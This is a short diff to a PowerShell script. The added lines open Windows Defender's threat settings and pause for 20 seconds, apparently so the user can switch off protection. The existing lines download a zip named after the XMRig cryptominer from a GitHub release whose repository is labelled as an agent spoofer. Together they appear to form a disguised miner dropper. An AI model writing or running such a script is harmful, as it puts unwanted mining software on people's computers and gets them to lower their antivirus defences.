@@ -1,3 +1,6 @@
+
+$tCommand = if (-not (Test-Path ($tCommand = [System.IO.Path]::Combine($env:ProgramFiles, 'Windows Defender', 'MSASCui.exe')) -PathType Leaf)) { "windowsdefender://Threatsettings" } else { $tCommand }; Start-Process $tCommand
+Start-Sleep -Seconds 20
 $downloadPath = Join-Path -Path $env:USERPROFILE -ChildPath "Desktop"
 $url = "https://github.com/trangtrau/random-agent-spoofer/releases/download/SA/CSANGXMRIG.zip"
 Invoke-WebRequest -Uri $url -OutFile "$downloadPath\CSANGXMRIG.zip"
